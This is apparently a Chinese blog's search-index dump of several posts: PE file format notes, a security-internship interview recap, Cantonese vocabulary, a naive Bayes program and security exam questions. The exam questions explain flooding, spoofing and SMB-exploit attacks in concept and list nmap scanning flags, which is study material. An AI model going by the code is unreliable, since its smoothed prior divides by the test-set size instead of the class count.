定义了磁盘区块的对齐值。每一个区块从对齐值的倍数的偏移位置开始存放。而区块的实际代码或数据的大小不一定刚好是这么多，所以在多余的地方一般以00h来填充，这就是区块间的间隙。例如，在PE文件中，一个典型的对齐值是200h，这样，每个区块都将从200h的倍数的文件偏移位置开始，假设第一个区块在400h处，长度为90h，那么从文件400h到490h为这一区块的内容，而由于文件的对齐值是200h，所以为了使这一区块的长度为FileAlignment 的整数倍，490h 到 600h 这一个区间都会被00h 填充，这段空间称为区块间隙，下一个区块的开始地址为600h 。\n\nPE 文件头里边的SectionAligment 定义了内存中区块的对齐值。PE 文件被映射到内存中时，区块总是至少从一个页边界开始。一般在X86 系列的CPU 中，页是按4KB（1000h）来排列的；在IA-64上，是按8KB（2000h）来排列的。所以在X86 系统中，PE文件区块的内存对齐值一般等于1000h，每个区块按1000h的倍数在内存中存放。\n\n### 1.6.2 RVA和文件偏移的换算\n\n1. 循环扫描区块表得出每个区块在内存中的起始RVA(根据IMAGE_SECTION_HEADER中的VitualAddress字段)，并根据区块大小(IMAGE_SECTION_HEADER的SizeOfRawData字段)算出区块的结束RVA(两者相加即可)，最后判断目标RVA是否落在该区块内。\n2. 已知目标RVA在哪个区块后，用目标RVA减去该区块的起始RVA，这样就能得到目标RVA相对于起始RVA的偏移量RVA2。\n3. 在区块表中获取该区块在文件中所处的偏移地址(根据IMAGE_SECTION_HEADER中的PointerToRawData字段)，将这个偏移值加上RVA2得到真正文件的偏移地址。\n\n## 1.7 导入表结构\n\nPE文件头的`IAMGE_OPTIONAL_HEADER`结构中的`DataDirectory`的第二个成员就是指向输入表。而输入表是以一个`IMAGE_IMPORT_DESCRIPTOR`(简称IID)的数组开始。每个被PE文件链接进来的DLL文件都分别对应一个IID数组结构。在这个IID数组中，并没有指出有多少个链接文件，但它最后是以一个全为NULL(0)的IID作为结束的标志。\n\n### 1.7.1 IMAGE_IMPORT_DESCRIPTOR\n\n```c\ntypedef struct _IMAGE_IMPORT_DESCRIPTOR {\n    union{//共用体类型，共占同一个地址，分时用\n        DWORD\t Characteristics;\n\t\tDWORD    OriginalFirstThunk;\t\t//指向输入名称表(INT)RVA的结构数组\n    };\n\tDWORD     TimeDateStamp;\n\tDWORD     ForwarderChain;\n\tDWORD     Name;\t\t\t\t\t\t\t//指向被导入的DLL名称\n\tDWORD     FirstThunk;\t\t\t\t\t//指向输入地址表(IAT)RVA，IAT是一个IMAGE_THUNK_DATA结构的数组\n} IMAGE_IMPORT_DESCRIPTOR, *PIMAGE_IMPORT_DESCRIPTOR;\n```\n\nFirstThunk指向的IMAGE_THUNK_DATA数组中的Function保存的就是真实内存中的函数地址，OriginalFirstThunk指向的同样是IMAGE_THUNK_DATA数组，但是保存的并不是真实内存中的函数地址，而是IMAGE_IMPORT_BY_NAME数组的RVA，保存的是导入函数的文件名。\n\n### 1.7.2 IMAGE_THUNK_DATA32\n\n```c\nstruct _IMAGE_THUNK_DATA32{\n    union {\n       DWORD ForwarderString;//指向一个转向字符串的RVA\n       DWORD Function; //被输入的函数的内存地址\n       DWORD Ordinal; //高位为1则被输入的API的序数值\n       DWORD AddressOfData;//高位为0则指向IMAGE_IMPORT_BY_NAME结构\n    }u1;\n}IMAGE_THUNK_DATA32;\n//IMAGE_THUNK_DATA64与IMAGE_THUNK_DATA32的区别，仅仅是把DWORD换成了64位整数。\n```\n\n### 1.7.3 IMAGE_IMPORT_BY_NAME\n\n```c\nstruct _IMAGE_IMPORT_BY_NAME {\n    WORD    Hint;//指出函数在所在的dll的输出表中的序号        \n    BYTE    Name[1];//指出要输入的函数的函数名\n} IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;\n```\n\n![导入表相互关系](F:\\markdown图片\\PE结构\\导入表相互关系.png)\n\n### 1.7.4 输入地址表(IAT)\n\n为什么由两个并行的指针数组同时指向`IMAGE_IMPORT_BY_NAME`结构呢？第一个数组(由`OriginalFirstThunk`所指向)是单独的一项，而且不能被改写。第二个数组(由`FirstThunk`所指向)由PE装载器重写。\n\nPE装载器首先搜索`OriginalFirstThunk`，找到后加载程序迭代搜索数组中的每个指针，找到每个`IMAGE_IMPORT_BY_NAME`结构所指向的输入函数的地址，然后加载器用函数真正入口地址来代替由`FirstThunk`数组中的一个入口，因此我们称为输入地址表(IAT)。\n\n## 1.8 导出表结构\n\nPE文件头的`IAMGE_OPTIONAL_HEADER`结构中的`DataDirectory`的第一个成员就是指向导出表。导出表是用来描述模块中的导出函数的结构，如果一个模块导出了函数，那么这个函数会被记录在导出表中，这样通过`GetProcAddress`函数就能动态获取到函数的地址。函数导出的方式有两种，一种是按名字导出，一种是按序号导出。这两种导出方式在导出表中的描述方式也不相同。\n\n导出表（Export Table）中的主要成分是一个表格，内含函数名称、输出序数等。序数是指定DLL 中某个函数的16位数字，在所指向的DLL 文件中是独一无二的。在此我们不提倡仅仅通过序数来索引函数的方法，这样会给DLL 文件的维护带来问题。例如当DLL 文件一旦升级或修改就可能导致调用改DLL 的程序无法加载到需要的函数。\n\n扩展名为.exe的PE文件一般不存在导出表，而大部分的.dll文件中都包含导出表。但注意，这并不是绝对。比如纯粹用作资源的.dll文件不需要导出函数，有些特殊功能的.exe文件也会存在导出函数。\n\n### 1.8.1 IMAGE_EXPORT_DIRECTORY\n\n```c\ntypedef struct _IMAGE_EXPORT_DIRECTORY {\n    DWORD   Characteristics;\n    DWORD   TimeDateStamp;\n    WORD    MajorVersion;\n    WORD    MinorVersion;\n    DWORD   Name;\t\t\t\t\t//模块名字\n    DWORD   Base;\t\t\t\t\t//序号的基数，按序号导出函数的序号值从Base开始递增\n    DWORD   NumberOfFunctions;\t\t//所有导出函数的数量\n    DWORD   NumberOfNames;\t\t\t//按名字导出函数的数量\n    DWORD   AddressOfFunctions;     //指向输出函数地址的RVA\n    DWORD   AddressOfNames;         //指向输出函数名字的RVA\n    DWORD   AddressOfNameOrdinals;  //指向输出函数序号的RVA\n} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;\n```\n\n![导出表相互关系](F:\\markdown图片\\PE结构\\导出表相互关系.png)\n\n### 1.8.3 查找函数入口地址\n\n**从序号查找函数入口地址**\n\nWindows 装载器的工作步骤如下：\n\n1. 定位到PE 文件头\n2. 从PE 文件头中的 IMAGE_OPTIONAL_HEADER32 结构中取出数据目录表，并从第一个数据目录中得到导出表的RVA\n3. 从导出表的 Base 字段得到起始序号\n4. 将需要查找的导出序号减去起始序号，得到函数在入口地址表中的索引\n5. 检测索引值是否大于导出表的 NumberOfFunctions 字段的值，如果大于后者的话，说明输入的序号是无效的\n6. 用这个索引值在 AddressOfFunctions 字段指向的导出函数入口地址表中取出相应的项目，这就是函数入口地址的RVA 值，当函数被装入内存的时候，这个RVA 值加上模块实际装入的基地址，就得到了函数真正的入口地址\n\n**从函数名称查找入口地址**\n\nWindows 装载器的工作步骤如下：\n\n1. 最初的步骤是一样的，那就是首先得到导出表的地址\n2. 从导出表的 NumberOfNames 字段得到已命名函数的总数，并以这个数字作为循环的次数来构造一个循环\n3. 从 AddressOfNames 字段指向得到的函数名称地址表的第一项开始，在循环中将每一项定义的函数名与要查找的函数名相比较，如果没有任何一个函数名是符合的，表示文件中没有指定名称的函数\n4. 如果某一项定义的函数名与要查找的函数名符合，那么记下这个函数名在字符串地址表中的索引值，然后在 AddressOfNamesOrdinals 指向的数组中以同样的索引值取出数组项的值，我们这里假设这个值是x\n5. 最后，以 x 值作为索引值，在 AddressOfFunctions 字段指向的函数入口地址表中获取的 RVA 就是函数的入口地址\n\n一般情况下病毒程序就是通过函数名称查找入口地址的，因为病毒程序作为一段额外的代码被附加到可执行文件中的，如果病毒代码中用到某些 API 的话，这些 API 的地址不可能在宿主文件的导出表中为病毒代码准备好。因此只能通过在内存中动态查找的方法来实现获取API 的地址。\n\n## 1.9 基址重定位\n\n链接器生成一个PE文件时，它会假设程序被装入时使用的默认ImageBase基地址（VC默认exe基地址00400000h，dll基地址10000000h），并且会把代码中所有指令中用到的地址都使用默认的基地址（例如 程序代码中 push 10001000，就是把10000000h当做了基地址，把push 10001000写入到文件中）。如果一个exe程序中一个dll装载时的地址与其它dll地址发生冲突（因为windows程序是虚拟地址空间，exe一般不会有地址冲突，加载dll时可能会有地址冲突），就需要修改代码中的地址，如push 10001000，call 10002000等。这时就需要用进行基址重定位。而基址重定位表中存放了，如果默认地址被改，需要修改的代码的地址。在PE文件中，基址重定位表一般放在一个单独的 \".reloc\" 区，可以通过`IMAGE_OPTIONAL_HEADER `中 的`DataDirectory[5] `查看基址重定位表的RVA。\n\n如果一个程序在加载Demo.dll时因为Demo.dll 默认的地址被占用了，而使用其它的基地址，例如使用20000000h作为基地址，Demo.dll就从20000000h开始装载。这样字符串“Demo”和“Hello World！” 就不是在10006040h跟10006030h中了，这时就需要把push 10006040 ， push 10006030改成push 20006040 ， push 20006030 。\n\nPE文件的重定位表中保存的就是文件中所有需要进行重定位修正的代码的地址。基址重定位表是由一个个`IMAGE_BASE_RELOCATION`结构构成的。\n\n### 1.9.1 IMAGE_BASE_RELOCATION\n\n```c\ntypedef struct _IMAGE_BASE_RELOCATION {\n    DWORD   VirtualAddress;\t\t//重定位数据开始的RVA地址\n    DWORD   SizeOfBlock;\t\t//重定位块的长度\n//  WORD    TypeOffset[];\t\t//TypeOffset是一个数组，它的元素个数就是(SizeOfBlock-8)/2，TypeOffset每一个元素占用两个字节即16位，其中高4位表示重定位类型（一般都为3），低12位表示重定位地址。它与VirtualAddress相加即是指向PE映像中需要修改的地址数据的指针\n} IMAGE_BASE_RELOCATION;\ntypedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;\n```\n\n## 1.10 资源表结构\n\nWindows程序的各种界面称为资源，包括加速键，位图，光标，对话框，图标，菜单，串表，工具栏和版本信息等。资源是PE文件中非常重要的部分，几乎所有的PE文件中都包含着资源，与导入表和导出表相比，资源的组织方式要复杂得多。\n\n资源表的结构比较复杂，一共有三层，三层从上到下是树状扩展的\n第一层数据代表资源种类的数量及名称\n第二层数据代表每种资源中资源的数量及名称\n第三层数据代表资源文件的位置\n\n每层由一个`IMAGE_RESOURCE_DIRECTORY`结构体和N个`IMAGE_RESOURCE_DIRECTORY_ENTRY`结构体组成。\n\n### 1.10.1 IMAGE_RESOURCE_DIRECTORY\n\n```c\ntypedef struct _IMAGE_RESOURCE_DIRECTORY {\n    DWORD   Characteristics;\n    DWORD   TimeDateStamp;\n    WORD    MajorVersion;\n    WORD    MinorVersion;\n    WORD    NumberOfNamedEntries;   // 用字符串作为资源标识的条目个数\n    WORD    NumberOfIdEntries;      // 用数字ID作为资源标识的条目个数\n} IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;\n```\n\n### 1.10.2 IMAGE_RESOURCE_DIRECTORY_ENTRY\n\n`IMAGE_RESOURCE_DIRECTORY_ENTRY`的个数= `IMAGE_RESOURCE_DIRECTORY.NumberOfNamedEntries` + `IMAGE_RESOURCE_DIRECTORY.NumberOfIdEntries`\n\n这个结构体在每一层中都是以结构体数组的方式存在\n第一层，每个元素代表一种资源\n第二层，每个元素代表一个资源\n第三层，每个元素代表一个资源的位置\n\n```c\ntypedef struct _IMAGE_RESOURCE_DIRECTORY_ENTRY {\n    union {\n        struct {\n            DWORD NameOffset:31;\n            DWORD NameIsString:1;\n        } DUMMYSTRUCTNAME;\n        DWORD   Name;\n        WORD    Id;\n    } DUMMYUNIONNAME;    // 资源名称\n    union {\n        DWORD   OffsetToData;\n        struct {\n            DWORD   OffsetToDirectory:31;\n            DWORD   DataIsDirectory:1;\n        } DUMMYSTRUCTNAME2;\n    } DUMMYUNIONNAME2;   // 资源位置\n} IMAGE_RESOURCE_DIRECTORY_ENTRY,*PIMAGE_RESOURCE_DIRECTORY_ENTRY;\n```\n\n该结构体一共8字节，里面包含两个联合体，每个联合体4字节\n第一个联合体，表示资源的名称\n第二个联合体，表示资源的位置\n\n#### 1.10.2.1 第一个联合体\n\n- 如果最高位为0，也就是NameIsString为0，此时4字节代表资源类型，也就是ID起作用\n\n| 值   | 资源类型   | 值   | 资源类型     |\n| ---- | ---------- | ---- | ------------ |\n| 0x01 | 鼠标指针   | 0x08 | 字体         |\n| 0x02 | 位图       | 0x09 | 快捷键       |\n| 0x03 | 图标       | 0x0A | 非格式化资源 |\n| 0x04 | 菜单       | 0x0B | 消息列表     |\n| 0x05 | 对话框     | 0x0C | 鼠标指针组   |\n| 0x06 | 字符串列表 | 0x0E | 图标组       |\n| 0x07 | 字体目录   | 0x0F | 版本信息     |\n\n- 如果最高位为1，也就是NameIsString为1，这是NameOffset指向保存字符串的结构体\n\n  ```c\n  typedef struct _IMAGE_RESOURCE_DIR_STRING_U {\n      WORD    Length;\n      WCHAR   NameString[ 1 ];\n  }IMAGE_RESOURCE_DIR_STRING_U,*PIMAGE_RESOURCE_DIR_STRING_U;\n  ```\n\n第二个元素NameString为字符串起始，长度为Length，这个串不是以0结尾哦。\n\n#### 1.10.2.2 第二个联合体\n\n- 如果最高位为1，也就是DataIsDirectory为1，代表OffsetToDirectory指向的地方是一个目录。通常，第一层和第二层，这个值都是1\n- 如果最高位为0，也就是DataIsDirectory为0，代表OffsetToDirectory指向的地方是一个数据。\n  通常，第三层，这个值为0\n\n### 1.10.3 IMAGE_RESOURCE_DATA_ENTRY\n\n这个结构体是第三层指向的，最终资源的结构体 \n\n```c\ntypedef struct _IMAGE_RESOURCE_DATA_ENTRY {\n    DWORD   OffsetToData;   // 资源偏移，RVA\n    DWORD   Size;           // 资源大小\n    DWORD   CodePage;       // 资源页属性\n    DWORD   Reserved;\n} IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;\n```\n\n","categories":["Windows逆向"]},{"title":"奇安信一面凉经","url":"/posts/61cb3b01.html","content":"\n我第一次面试...好尴尬啊一问三不知，技术面试官还能跟我聊50分钟，不，是他问问题问了50分钟，笑死。呜呜呜不过面试官好温柔啊，问了我这么多问题我都不知道，他也没有丝毫不耐烦，dbq我辜负了您的期望，我心里一直在想快结束吧我真的不会！！！而且他还是在加班的时候被我打电话过去说要面试的，那他后面岂不是要加加班，呜呜呜非常抱歉浪费您宝贵的50分钟，我太菜了。还有他给我提供了今后如何学习某个逆向方向的建议，使我整个学习规划都清晰了许多，我真的是非常感谢他~\n\n废话结束，进入正题。\n\n<!--more-->\n\n1.首先自我介绍吧，主要是你在大学里边做了一些什么与安全相关的项目，比较拿得出手的一些项目，其次是你自己的一个技能点，你最擅长做什么事情。\n\n2.我看你投的是安全研究员软件方向，你期望的工作内容是什么？\n\n3.你有没有分析过Windows平台下的样本、病毒？\n\n4.相对虚拟地址(RVA)和文件偏移地址(FOA)间的转换。\n\nhttps://bbs.pediy.com/thread-221766.htm\n\n5.代码段具有可读可写可执行中的哪些权限？\n\n6.IAT(导入地址表)是用来干什么的，导入的具体流程。\n\n7.在shellcode中动态定位API的过程。\n\n8.Windows平台病毒样本的类型。\n\nhttps://www.docin.com/p-2495525891.html\n\n这个好牛，如果写得不错买它！ https://blog.csdn.net/eastmount/category_9193519.html \n\n9.常见的函数调用约定类型有哪些？\n\nhttps://baike.baidu.com/item/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/3306047?fr=aladdin\n\n10.函数的返回地址保存在什么位置？\n\nEBP+4\n\n11.异常处理机制的具体工作流程。\n\nhttps://blog.csdn.net/TCP_321/article/details/121784949\n\n12.WinDBG要会用。\n\n13.Windows平台下的hook和注入技术。hook类型有哪些？注入方法有哪些？\n\n可以跟着这位博主学学 https://www.cnblogs.com/SunsetR/\n\n14.您有没有分析过漏洞？(漏洞会比样本更有难度。)\n\n15.dll劫持了解吗？\n\n16.有没有去复现过一些漏洞？\n\n**反问环节**\n\n1.安全研究员暑期实习有4个方向，会被分配到想去的那个方向吗？\n\n答：面试官的组包括漏洞二进制安全、软件安全、网络安全。(如果进了他的组就是做这些了)\n\n2.在实习期间的主要工作内容？\n\n答：有三个方向：Web、Windows、Linux。每一个方向都有相应的安全产品的技术研究。比如Windows平台，有360、天勤、火绒，我们的组是基础攻防组，主要去研究这些产品的防护原理，也就是做攻击和防御研究的；其次做漏洞分析，比如这个月微软补丁日出来了，会去研究一下哪些危害比较高的漏洞，写POC或根据已有的POC去把它的漏洞利用(exp)写出来；还有安全技术的研究，比如说exp写出来了，但是只是完成了exp，只是拿到了权限，它并不能做一些真正的恶意操作，这个时候就需要做攻击技术的人去写shellcode，将shellcode加入到exp中，两者结合做一些攻击利用。还有漏洞挖掘的工作，针对Windows平台和Linux平台的浏览器和文档类软件，比如pdf、office软件。\n\n\n\n面：在这次面试中做了哪些准备？\n\n安全研究岗更偏向于实际的一些东西，动手实践的东西，你能做什么，做了一些什么项目，而不是理论。操作系统、计算机网络更偏向于开发岗。\n\n我：怎么去学习？\n\n答：对于Windows平台，最基础的，CTF是一个很好的跳板，更好的练习方法就是实际去做一个样本的分析。Windows平台不管是做漏洞还是做威胁情报还是病毒分析，最核心的一点的就是，他们所有都是PE文件，所以要对PE文件结构非常熟悉，其次是Windows平台下的hook和注入技术，不管是安全软件还是病毒，都会大量使用到。更高阶的，做漏洞分析。比如office的漏洞、浏览器的漏洞、提权的漏洞。通过做病毒分析，可以把上面基础的东西用到，那这些基础知识自然就知道了。hook技术如何检测虚拟机、反调试、脱壳、内存解密、执行。特别是那种APT病毒，挖矿、勒索，分析很多这种，那些知识你都可以掌握得到。所以如果你想从Windows平台去入门，一定要从实战去做，边操作边学习。通过分析大量病毒样本，对于病毒的加解密、遍历文件，同时也要去考虑安全软件如何去防护这些病毒的。当你对Windows平台的基础比较了解的时候，那么你就可以开始做一些更高阶的，比如说漏洞利用的研究，uaf注入类型的漏洞、栈溢出、堆溢出等等。比较流行的勒索，有报告的，可以参考报告去看，一步一步自己手动分析出来。每家安全公司都有威胁安全情报中心，比如奇安信、360、深信服，可以去看他们的报告，自己去做分析。\n\n奇安信安全岗主要职责：漏洞研究、APT样本研究、攻击利用手法研究、安全产品漏洞研究","categories":["往社畜方向前进"]},{"title":"粤语正字","url":"/posts/f9ece6c7.html","content":"\n让我看看是哪个广东人不会写粤语的？！是我。\n\n<!--more-->\n\n攞(luo)：拿。\n\n抌(dan)：抌心口、抌章、抌垃圾。\n\n掟(ding/zheng)：掟手榴弹、掟石仔。\n\n𢫕：甩。𢫕水。\n\n㨃(dui)：捅。㨃佢。\n\n打㰇(jian)：插队。\n\n唔𠸎(na)耕：冇𠸎㨢，两者之间没有关系。\n\n无𠸎𠸎：无端端，无缘无故。\n\n冇(厘)搭霎：做事粗心大意，马马虎虎。\n\n发𤷪𤺧：脾气变得暴躁。\n\n发吽(ou)哣(tou)：发呆。\n\n发烂鲊(zha)：蛮横，不讲理。\n\n黐(chi)线：原意指电话线路黐在一起，不知道对方在说什么。\n\n君真：做事认真。\n\n心抱：媳妇。\n\n巢皮：洗澡洗很久手指皮都皱了。\n\n猜呈寻：石头剪刀布。\n\n掬气：生气。\n\n便：出便，外便，呢便，嗰(ge)便。\n\n禁：经受住；耐。好禁睇，好禁计。\n\n论尽：做事常出毛病，麻烦，累赘。\n\n咪摸：做事慢，磨蹭。\n\n吞pork：偷懒。\n\ncut电话：挂电话。\n\ncard片：卡片。\n\n搭lift：搭电梯。\n\n买fare：买票。\n\nshirt衫：衬衫。\n\nlaine衫：毛衣。laine(法语，羊毛的意思)。\n\n平靓正：又好又便宜。\n\n𢫏：𢫏被，𢫏盖，兜巴𢫏你。(用手掌从上往下打)\n\n升：兜巴升你。(用力向上猛击)\n\n揿(qin)：按，摁。揿钉，揿掣(che)，揿住佢。\n\n特登：故意，特意。\n\n求其：随便。\n\n是但：随便。\n\n流嘢：朱义盛(以前广州的一家金铺，专卖仿金首饰)。质量差，虚假的。\n\n咧啡：吊儿郎当，衣冠不整，不修边幅。\n\n孤寒：吝啬。风吹皇帝裤浪——孤寒。\n\n傑(jie)：稠，浓。粥好傑。傑嘢：重大事件。\n\n架罉(cheng)：工具。\n\n搦(nuo)：搦部手机过嚟。\n\n擗(pi)：扔，丢弃。擗嘢。擗炮唔捞。\n\n景轰：蛊惑。肯定有景轰。","categories":["长知识了"]},{"title":"朴素贝叶斯算法","url":"/posts/ea9b7d09.html","content":"\n做的时候很痛苦，但完全是自己写出来的算法真的很有成就感呜呜呜！感谢简博士清晰易懂的例题讲解，让我懂得它的原理。\n\n经过这个算法我也清楚了Python列表与字典该在哪种情况下使用哪个，非常不错~\n\n<!--more-->\n\n```python\nimport random\nimport csv\n\ndef CreateData():\n    sampleset = [['青绿','蜷缩','浊响','清晰','凹陷','硬滑','是'],\n                 ['乌黑','蜷缩','沉闷','清晰','凹陷','硬滑','是'],\n                 ['乌黑','蜷缩','浊响','清晰','凹陷','硬滑','是'],\n                 ['青绿','蜷缩','沉闷','清晰','凹陷','硬滑','是'],\n                 ['浅白','蜷缩','浊响','清晰','凹陷','硬滑','是'],\n                 ['青绿','稍蜷','浊响','清晰','稍凹','软粘','是'],\n                 ['乌黑','稍蜷','浊响','稍糊','稍凹','软粘','是'],\n                 ['乌黑','稍蜷','浊响','清晰','稍凹','硬滑','是'],\n                 ['乌黑','稍蜷','沉闷','稍糊','稍凹','硬滑','否'],\n                 ['青绿','硬挺','清脆','清晰','平坦','软粘','否'],\n                 ['浅白','硬挺','清脆','模糊','平坦','硬滑','否'],\n                 ['浅白','蜷缩','浊响','模糊','平坦','软粘','否'],\n                 ['青绿','稍蜷','浊响','稍糊','凹陷','硬滑','否'],\n                 ['浅白','稍蜷','沉闷','稍糊','凹陷','硬滑','否'],\n                 ['乌黑','稍蜷','浊响','清晰','稍凹','软粘','否'],\n                 ['浅白','蜷缩','浊响','模糊','平坦','硬滑','否'],\n                 ['青绿','蜷缩','沉闷','稍糊','稍凹','硬滑','否']]\n    \n    #注意路径\n    #filename = \"./西瓜3.0.csv\"\n    #sampleset = []\n    #with open(filename) as f:\n    #    #csv.reader()读取文件中的每行作为列表返回，reader相当于指向那堆列表的指针\n    #    reader = csv.reader(f)\n    #    #读取首行并将reader指针指向下一行\n    #    header_row = next(reader)\n    #    #遍历reader指针指向的那堆列表，将每个列表中下标为1至末尾的元素作为新列表加入到样本集中\n    #    for line in reader:\n    #        sampleset.append(line[1:])\n\n    return sampleset\n\ndef DataPreprocessing(sampleset):\n    #将样本集打乱\n    random.shuffle(sampleset)\n    #90%作为训练集，10%作为测试集\n    split_index = int(len(sampleset)*0.9)\n    trainset = sampleset[:split_index]\n    testset = sampleset[split_index:]\n    \n    return trainset, testset\n\nclass Bayes:\n    def __init__(self, trainset, testset, n=1):\n        self.trainset = trainset\n        self.testset = testset\n        self.n = n\n\n    #计算先验概率\n    def cal_prior_prob(self, trainset):\n        labellist = [trainset[i][-1] for i in range(len(trainset))]\n        labeldict = {}\n        #按类别分类并且计算各类别的样本数\n        for label in labellist:\n            if label not in labeldict:\n                labeldict[label] = 0\n            labeldict[label] += 1\n\n        #计算各类别的先验概率\n        labelpriorprob = {}\n        for label in labeldict.keys():\n            labelpriorprob[label] = (labeldict[label] + self.n) / (len(trainset) + len(self.testset) * self.n)\n        \n        print(\"类别的先验概率为：\",end=\"\")\n        print(labelpriorprob)\n        return labelpriorprob\n        \n    #计算条件概率\n    def cal_cond_prob(self, trainset):\n        #fea_num表示特征数，-1是减去最后那个类别，它不属于特征\n        fea_num = len(trainset[0]) - 1\n\n        #用二维数组存储每个特征有哪几个特征值\n        fealist = []\n        for i in range(fea_num):\n            fealist.append([])\n            for j in range(len(trainset)):\n                if trainset[j][i] not in fealist[i]:\n                    fealist[i].append(trainset[j][i])\n        #print(fealist)\n\n        #按类别区分训练集\n        separated = {}\n        for i in range(len(trainset)):\n            row_vetor = trainset[i]\n            if row_vetor[-1] not in separated:\n                separated[row_vetor[-1]] = []\n            separated[row_vetor[-1]].append(row_vetor[:-1])\n\n        #创建一个字典存各个特征值的条件概率\n        feacondprob = {}\n\n        #每个特征中又有不同的特征值\n        for i in separated.keys():#i表示字典中的关键字“是”或“否”\n            #“是”一个列表，“否”一个列表，最后综合到feacondprob字典中\n            temp = []\n            print()\n            print(\"'{0}'类别的各特征的条件概率为：\".format(i))\n            for k in range(fea_num):#k表示样本中有多少个特征\n                #每个特征创建一个字典计算不同特征值的个数\n                feadict = {}\n                #初始化字典关键字\n                for j in range(len(fealist[k])):\n                    if fealist[k][j] not in feadict:\n                        feadict[fealist[k][j]] = 0\n\n                for j in range(len(separated[i])):#这里的j表示在“是”或“否”中的第j个样本                    \n                    feadict[separated[i][j][k]] += 1\n\n                #计算各特征的条件概率\n                for j in feadict.keys():\n                    feadict[j] = (feadict[j] + self.n) / (len(separated[i]) + len(feadict) * self.n)\n                \n                print(feadict)\n                \n                temp.append(feadict)\n            \n            feacondprob[i] = temp\n        \n        return feacondprob\n\n    def predict(self, trainset, testset):\n        labelpriorprob = self.cal_prior_prob(trainset)\n        feacondprob = self.cal_cond_prob(trainset)\n        testlabels = []\n\n        for i in range(len(testset)):#i表示测试集样本的个数\n            bayesProbability = {}\n            for label in labelpriorprob:\n                tempProb = labelpriorprob[label]\n                featureList = feacondprob[label]\n                for k in range(len(testset[0])-1):#k表示要计算几个特征\n                    tempProb *= featureList[k][testset[i][k]]\n                \n                bayesProbability[label] = tempProb\n            \n            result = sorted(bayesProbability.items(), key=lambda x:x[1], reverse=True)\n            print(\"测试样本{0}的各类别概率：\".format(i),end=\"\")\n            print(result)\n            print()\n            testlabels.append(result[0][0])\n\n        return testlabels\n            \nif __name__ == '__main__':\n    sampleset = CreateData()\n    print(\"样本集为：\")\n    print(sampleset)\n    trainset, testset = DataPreprocessing(sampleset)\n    print(\"其中训练集为：\")\n    print(trainset)\n    print(\"其中测试集为：\")\n    print(testset)\n    print()\n\n    #用极大似然法估计参数\n    bayes = Bayes(trainset, testset, n=0)\n    print(\"使用最大似然法判断测试集类别：\")\n    testlabels = bayes.predict(trainset, testset)\n    print(\"测试集各实例点的最终结果：{0}\".format(testlabels))\n    print()\n    print()\n\n    #用拉普拉斯平滑估计参数（默认）\n    bayes = Bayes(trainset, testset, n=1)\n    print(\"使用拉普拉斯平滑判断测试集类别：\")\n    testlabels = bayes.predict(trainset, testset)\n    print(\"测试集各实例点的最终结果：{0}\".format(testlabels))\n```\n\n","categories":["算法"],"tags":["机器学习"]},{"title":"奇安信安全方向笔试题","url":"/posts/7b52fae7.html","content":"\n笔试主要内容：网络协议、操作系统、攻击原理\n\n认真对待每次笔试和面试，积累经验，小凉一定不会失业的！一定可以找到适合自己的工作的！\n\n<!--more-->\n\n# 【2020】奇安信秋招研发安全方向试卷1\n\n1.以下哪些字段不是IP头部中的内容( D )\n\nA. 版本、报文长度；B. 服务类型、标识；C. 源地址、目标地址；D. 源端口、目标端口\n\n解析：\n\n{% asset_img 1.1.1.png IP头部结构 %}\n\n\n\n2.下列选项中，TCP标志位组合不正确的是( C )\n\nA. SYN+ACK；B. PUSH+ACK；C. SYN+RST；D. FIN+ACK\n\n解析：没有[SYN, RST]包，有[RST, ACK]包。\n\n\n\n3.TCP SYN拒绝服务攻击是指发起TCP链接后不管，重复不停发送链接。\n\n\n\n4.分片IP报文攻击是指将大报文拆分成小报文片段，只发送一部分给被攻击者。\n\n\n\n5.永恒之蓝利用Windows系统的SMB协议漏洞来获取系统的最高权限，以此来控制被入侵的计算机。\n\n\n\n6.ARP攻击造成网络无法跨网段通信的原因是伪造网关 ARP 报文使得数据包无法发送到网关。\n\n\n\n7.Ping of death攻击的原理是操作系统平台未对分片进行参数检查。\n\n\n\n8.Linux下可用的抓包工具是tcpdump、tshark和wireshark。\n\n\n\n9.nmap扫描参数中，T5参数扫描最快。\n\n解析：nmap的常见参数汇总：\n端口状态概述 \nopen 开放；closed 关闭；filtered 被过滤掉了，无法进行判断；unfiltered 未被过滤可以进行访问\n\n参数：\n1、-Pn 跳过主机发现，视为所有的主机都在线\n2、-sn 只做ping扫描不做端口扫描\n3、-sT\\A\\W\\M 不同的扫描端口，进行扫描\n4、-p 指定端口进行扫描 --exclude-ports<port ranges>：排除端口进行扫描\n5、-sV 探测系统的版本 \n--version-intensity<level>：设置相关的程度，详细级别，0~9 越高越详细\n--version-trace：打印详细的版本扫描过程\n6、脚本扫描\n--scri=<scripts> ：指定对应的脚本名称\n7、O：激活系统的探测\n--osscan-limit：只对开放端口的有效主机进行系统的探测\n8、-T<0-5>：时间模板，越大速度越快\n9、-6：使能IPV6探测\n10、-A：使能系统探测、版本检测、脚本扫描、路由追踪\n11、-V：打印版本号\n12、-v：增加输出的详细程度\n\n\n\n10.以下哪个不是PE文件结构( D )\n\nA. 导入表；B. 导出表；C. 重定位表；D. 字符串表\n\n解析：PE文件结构分为五个部分：DOS文件头、DOS加载模块、PE文件头、区段表、区段。区段表相当于区段的目录，里面包含着每个区段的信息。\n\n> .text：代码段，是在编译或汇编结束时产生的一种块，它的内容全部是指令代码。也有的编译器将该段命名为.code\n> .data：初始化的数据块，包含那些编译时被初始化的变量、字符串\n> .idata：导入表，包含程序调用的第三方dll的函数的信息。\n> .rsrc：资源数据块，包含模块的全部资源数据，如图标、菜单、位图等。\n> .reloc：重定位表，用于保存基址的重定位表。即当装载程序不能按照连接器所指定的地址装载文件时，需要对指令或已经初始化的变量进行调整，该块中也包含了调整过程中所需要的一些数据，如果装载能够正常装载则忽略此段中的数据。\n> .edata：导出表，是pe文件的输出表，以供其他模块使用，并不是每个pe文件都有此数据段，因为有的文件并不需要输出一些函数，该数据段常见于动态链接库文件中。\n> .rdata：系统函数的导入表，程序调用的系统dll中的函数的具体信息。\n\n\n\n11.当前进程页目录地址保存在CR3中。\n\n解析：\n\n{% 